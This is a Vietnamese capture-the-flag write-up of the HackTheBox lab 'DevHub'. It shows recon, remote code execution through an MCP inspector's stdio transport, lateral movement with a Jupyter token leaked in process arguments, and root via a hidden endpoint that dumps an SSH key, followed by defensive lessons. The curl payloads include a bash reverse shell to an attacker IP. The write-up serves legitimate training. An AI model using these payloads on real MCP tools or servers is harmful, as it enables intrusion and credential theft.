---
title: "HackTheBox Write-up: DevHub"
date: 2026-06-02 
categories: [Write-ups, HackTheBox]
---
# HackTheBox - DevHub (Medium)

<p align="center">
  <img src="https://labs.hackthebox.com/storage/avatars/b4b74f0c978255ba45d4c3ab159f8a37.png" alt="DevHub" width="200"/>
</p>

| Info | Detail |
|------|--------|
| **Platform** | HackTheBox |
| **Machine** | DevHub |
| **OS** | Linux (Ubuntu 24.04) |
| **Difficulty** | Medium |
| **IP** | 10.129.115.17 |
| **Tech Stack** | Node.js, Python 3, Jupyter, MCP Protocol, nginx |

---

## Table of Contents

- [Tổng quan](#tổng-quan)
- [Reconnaissance](#reconnaissance)
  - [Nmap Scan](#nmap-scan)
  - [Web Enumeration (Port 80)](#web-enumeration-port-80)
  - [MCPJam Inspector (Port 6274)](#mcpjam-inspector-port-6274)
  - [API Endpoint Discovery](#api-endpoint-discovery)
- [Initial Access - RCE via MCP STDIO Transport](#initial-access---rce-via-mcp-stdio-transport)
  - [Phát hiện lỗ hổng](#phát-hiện-lỗ-hổng)
  - [Reverse Shell](#reverse-shell)
- [Lateral Movement - mcp-dev → analyst](#lateral-movement---mcp-dev--analyst)
  - [Enumeration nội bộ](#enumeration-nội-bộ)
  - [Khai thác Jupyter Notebook](#khai-thác-jupyter-notebook)
  - [User Flag](#user-flag)
- [Privilege Escalation - analyst → root](#privilege-escalation---analyst--root)
  - [Phân tích OPSMCP Server](#phân-tích-opsmcp-server)
  - [Khai thác Hidden API - Lấy SSH Key của Root](#khai-thác-hidden-api---lấy-ssh-key-của-root)
  - [Root Flag](#root-flag)
- [Tổng kết](#tổng-kết)

---

## Tổng quan

**DevHub** là một máy chủ nội bộ dành cho đội ngũ phát triển, tích hợp nhiều dịch vụ: MCPJam Inspector (công cụ debug giao thức MCP), Jupyter Notebook (phân tích dữ liệu), và một Git repository nội bộ. Bài lab xoay quanh việc khai thác lỗ hổng trong cách MCPJam Inspector xử lý kết nối `stdio` transport để đạt được RCE, sau đó leo quyền qua Jupyter Notebook và cuối cùng lợi dụng một Hidden API endpoint chạy dưới quyền root để lấy SSH private key.

**Attack Path:**

```
MCPJam Inspector (RCE via stdio)
        │
        ▼
   User: mcp-dev
        │
        │  Jupyter Token Leak (ps aux)
        ▼
   User: analyst  ──→  user.txt
        │
        │  OPSMCP Hidden API (ops._admin_dump)
        ▼
   User: root     ──→  root.txt
```

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.115.17
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
|   GetRequest:
|     HTTP/1.1 200 OK
|     <title>MCPJam Inspector</title>
```

> **Ghi chú:** Cần thêm `devhub.htb` vào file `/etc/hosts` trước khi truy cập web:
> ```bash
> echo "10.129.115.17 devhub.htb" | sudo tee -a /etc/hosts
> ```

**Tóm tắt kết quả scan:**

| Port | Service | Chi tiết |
|------|---------|----------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx 1.18.0 → redirect đến `http://devhub.htb/` |
| 6274 | HTTP | MCPJam Inspector (React SPA) |

### Web Enumeration (Port 80)

Truy cập `http://devhub.htb/`, trang chủ hiển thị giao diện "DevHub - Internal Development & Analytics Platform" với 3 service:

| Service | Mô tả | Trạng thái |
|---------|--------|------------|
| **MCP Inspector** | Model Context Protocol development and debugging tool | 🟢 Active - Port 6274 |
| **Analytics Dashboard** | Jupyter-based analytics environment | 🔒 Internal Only - `localhost:8888` |
| **Code Repository** | Internal Git server | 🔧 Maintenance Mode |

Gobuster trên port 80 không tìm thấy gì đáng chú ý ngoài `index.html`. Vhost scan cũng không phát hiện subdomain nào.

```bash
gobuster dir -u http://devhub.htb -w /usr/share/wordlists/dirb/common.txt
# Kết quả: chỉ có index.html

gobuster vhost -u http://devhub.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
# Kết quả: không tìm thấy
```

### MCPJam Inspector (Port 6274)

Truy cập `http://devhub.htb:6274`, giao diện MCPJam Inspector hiện ra với các menu: Servers, Chat, App Builder, Test Cases, Tools, Resources, Resource Templates. Trang hiển thị **"No servers connected"** và có nút **"+ Add Server"**.

MCPJam Inspector là một công cụ mã nguồn mở dùng để test và debug giao thức **MCP (Model Context Protocol)**. Nó cho phép kết nối đến các MCP server thông qua nhiều phương thức transport khác nhau (SSE, Streamable HTTP, STDIO).

> Gobuster trên port 6274 không hoạt động bình thường vì đây là một Single Page Application (SPA) — mọi path đều trả về HTTP 200 với cùng nội dung HTML.

### API Endpoint Discovery

Đọc file JavaScript của MCPJam để tìm các API endpoint ẩn:

```bash
curl -s http://devhub.htb:6274/assets/index-DRYhT9Xb.js | grep -oE '"/[a-zA-Z0-9_/\-]+"' | sort -u
```

Kết quả trả về nhiều endpoint API quan trọng:

```
/api/mcp/connect          ← Kết nối đến MCP server
/api/mcp/servers           ← Liệt kê server đã kết nối
/api/mcp/tools/execute     ← Thực thi MCP tools
/api/mcp/tools/list        ← Liệt kê tools
/api/mcp/resources/read    ← Đọc resources
/api/mcp/resources/list    ← Liệt kê resources
/api/mcp-cli-config        ← CLI config
...
```

Kiểm tra endpoint `/api/mcp/servers`:

```bash
curl -s http://devhub.htb:6274/api/mcp/servers | jq .
```
```json
{
  "success": true,
  "servers": []
}
```

Thử gọi `/api/mcp/connect` với body rỗng để xem yêu cầu:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8888"}'
# → {"success":false,"error":"serverConfig is required"}

curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"name":"test","transport":"sse","url":"http://localhost:8888/sse"}}'
# → {"success":false,"error":"serverId is required"}
```

Qua các lỗi trả về, chúng ta dần xác định được cấu trúc JSON cần gửi: cần cả `serverId` và `serverConfig`.

---

## Initial Access - RCE via MCP STDIO Transport

### Phát hiện lỗ hổng

Giao thức MCP hỗ trợ nhiều phương thức transport. Trong đó, **STDIO transport** hoạt động bằng cách khởi chạy một tiến trình con (child process) trên server và giao tiếp qua `stdin/stdout`. Nếu MCPJam Inspector không kiểm soát lệnh nào được phép chạy, kẻ tấn công có thể lợi dụng để **thực thi lệnh hệ thống tùy ý (RCE)**.

Thử kết nối với transport `stdio` và lệnh `/bin/bash`:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test1","serverConfig":{"name":"test1","transport":"stdio","command":"/bin/bash","args":["-c","id"]}}'
```

```json
{
  "success": false,
  "error": "Connection failed for server test1: MCP error -32000: Connection closed",
  "details": "MCP error -32000: Connection closed"
}
```

Lỗi `Connection closed` xảy ra do lệnh `id` chạy xong rồi thoát ngay, khiến pipe đóng lại. Nhưng điều quan trọng là: **lệnh đã được thực thi thành công trên server!** MCPJam chỉ báo lỗi vì process thoát trước khi hoàn tất quá trình handshake JSON-RPC của giao thức MCP.

Ngoài ra, thử kết nối SSE đến Jupyter (`localhost:8888`) cũng xác nhận Jupyter đang chạy:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"jupyter2","serverConfig":{"name":"jupyter2","transport":"streamable-http","url":"http://localhost:8888"}}'
```
```
Streamable HTTP error: Error POSTing to endpoint:
<html><title>403: Forbidden</title><body>403: Forbidden</body></html>
```

→ Jupyter đang hoạt động nhưng yêu cầu xác thực (403 Forbidden).

### Reverse Shell

Bật netcat listener trên máy Kali:

```bash
nc -lvnp 4444
```

Gửi payload reverse shell qua MCPJam Inspector:

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"revshell","serverConfig":{"name":"revshell","transport":"stdio","command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1"]}}'
```

Nhận được kết nối thành công:

```
listening on [any] 4444 ...
connect to [10.10.14.49] from (UNKNOWN) [10.129.115.17] 50348
bash: cannot set terminal process group (1062): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Nâng cấp shell cho dễ sử dụng:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, sau đó:
stty raw -echo; fg
```

**→ Đã có shell với quyền user `mcp-dev`.**

---

## Lateral Movement - mcp-dev → analyst

### Enumeration nội bộ

Kiểm tra các user trên hệ thống:

```bash
mcp-dev@devhub:~$ ls -la /home
drwxr-x---  9 analyst analyst 4096 May 27 12:22 analyst
drwxr-x---  4 mcp-dev mcp-dev 4096 May 27 12:22 mcp-dev
```

Không thể truy cập thư mục `/home/analyst`. Kiểm tra các process đang chạy:

```bash
mcp-dev@devhub:~$ ps aux | grep -i jupyter
```

```
analyst  1059  0.0  2.4 183076 97520 ?  Ss  06:08  0:06  /home/analyst/jupyter-env/bin/python3
    /home/analyst/jupyter-env/bin/jupyter-lab
    --ip=127.0.0.1 --port=8888 --no-browser
    --notebook-dir=/home/analyst/notebooks
    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
    --ServerApp.password= --ServerApp.allow_origin=
    --ServerApp.disable_check_xsrf=False

root     1067  0.0  0.7  37376 28684 ?  Ss  06:08  0:04
    /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

**Hai phát hiện quan trọng:**

1. **Jupyter Notebook** chạy dưới quyền user `analyst` với **token bị lộ trong tham số dòng lệnh**:
   ```
   --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
   ```

2. **OPSMCP Server** (`/opt/opsmcp/server.py`) chạy dưới quyền **root** — đây sẽ là vector để leo quyền lên root ở bước sau.

### Khai thác Jupyter Notebook

Sử dụng SSH Local Port Forwarding để truy cập Jupyter từ máy Kali:

**Bước 1: Thiết lập SSH key cho user `mcp-dev`**

Trên máy Kali:
```bash
ssh-keygen -t rsa -f ~/.ssh/devhub_rsa -N ""
cat ~/.ssh/devhub_rsa.pub
```

Trên reverse shell `mcp-dev`:
```bash
mkdir -p ~/.ssh
echo "<PUBLIC_KEY>" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**Bước 2: Port Forwarding**

```bash
ssh -i ~/.ssh/devhub_rsa -L 8888:127.0.0.1:8888 mcp-dev@10.129.115.17
```

**Bước 3: Truy cập Jupyter và lấy shell `analyst`**

Mở trình duyệt, truy cập `http://localhost:8888`, nhập token:
```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Trong giao diện Jupyter, mở **Terminal** mới → có được shell với quyền user `analyst`.

### User Flag

```bash
analyst@devhub:~$ cat /home/analyst/user.txt
```

**→ 🚩 User Flag captured!**

---

## Privilege Escalation - analyst → root

### Phân tích OPSMCP Server

Từ shell `analyst`, kiểm tra file `/opt/opsmcp/server.py`:

```bash
analyst@devhub:~$ ls -la /opt/opsmcp/
drwxr-xr-x 2 analyst analyst 4096 May 26 08:42 .
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

File thuộc sở hữu của `analyst` và có thể đọc. Phân tích mã nguồn:

```python
# API Key cho xác thực
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Các tool hiển thị công khai
VISIBLE_TOOLS = {
    "ops.system_status": {...},
    "ops.list_services": {...},
    "ops.check_disk": {...},
    "ops.view_logs": {...}
}

# Các tool ẨN - không hiển thị trong /tools/list nhưng vẫn gọi được!
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {...}
}
```

Đoạn code xử lý `ops._admin_dump` cho phép **đọc trực tiếp SSH private key của root**:

```python
elif tool_name == "ops._admin_dump":
    target = args.get('target', '')
    confirm = args.get('confirm', False)
    
    if target == "ssh_keys" and confirm:
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
        return jsonify({
            "target": "ssh_keys",
            "root_private_key": key_data,
        })
```

Vì server này chạy dưới quyền **root** (đã xác nhận qua `ps aux`), nó có đủ quyền để đọc file `/root/.ssh/id_rsa`.

### Khai thác Hidden API - Lấy SSH Key của Root

Gọi API `ops._admin_dump` với target `ssh_keys` và `confirm=true`, sử dụng `python3` để parse JSON và ghi key ra file đúng format:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' \
  | python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])" > /tmp/root_key
```

> **Lưu ý quan trọng:** Phải dùng `python3` (hoặc `jq -r`) để parse JSON response, không nên copy/paste thủ công vì các ký tự `\n` trong JSON sẽ không được chuyển thành dấu xuống dòng thật, khiến SSH báo lỗi `error in libcrypto`.

Phân quyền cho key và SSH vào root:

```bash
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@127.0.0.1
```

### Root Flag

```bash
root@devhub:~# cat /root/root.txt
```

**→ 🚩 Root Flag captured!**

---

## Tổng kết

### Tóm tắt các lỗ hổng

| # | Lỗ hổng | Mức độ | Tác động |
|---|---------|--------|----------|
| 1 | **MCP STDIO Command Injection** — MCPJam Inspector cho phép kết nối MCP server qua `stdio` transport mà không kiểm soát command được chạy | Critical | RCE → shell `mcp-dev` |
| 2 | **Sensitive Data Exposure** — Token xác thực của Jupyter bị lộ qua process arguments (`/proc/.../cmdline`) | High | Lateral Movement → shell `analyst` |
| 3 | **Insecure API Design (Hidden Admin Endpoint)** — API server chạy quyền root có hidden endpoint cho phép dump SSH private key mà chỉ cần API key (hardcoded trong source code) | Critical | Privilege Escalation → root |

### Bài học rút ra

1. **Không bao giờ cho phép user tùy ý chỉ định command** trong STDIO transport. Cần có whitelist các MCP server được phép kết nối.
2. **Không truyền secret qua command-line arguments.** Thay vào đó, sử dụng biến môi trường hoặc file cấu hình với quyền hạn chế.
3. **Hidden endpoints không phải là bảo mật.** Security through obscurity không bao giờ đủ. Mọi endpoint nhạy cảm đều cần cơ chế xác thực và phân quyền mạnh mẽ.
4. **Không hardcode API key trong source code**, đặc biệt khi source code có thể đọc được bởi user khác.

---

*Writeup by phat — HackTheBox Season 11*
